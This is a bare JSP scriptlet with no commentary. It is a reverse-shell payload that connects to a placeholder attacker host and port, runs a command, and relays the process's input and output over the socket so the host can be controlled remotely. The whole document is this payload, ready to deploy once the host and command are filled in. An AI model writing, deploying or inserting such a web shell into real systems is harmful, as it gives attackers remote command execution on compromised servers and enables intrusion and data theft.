<%
java.lang.String host="x.x.x.x";
int port=1337;
java.lang.String[] cmd={"commands", "here"};
java.lang.Process p=new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();java.net.Socket s=new java.net.Socket(host,port);java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50L);try {p.exitValue();break;}catch (java.lang.Exception e){}};p.destroy();s.close();
%>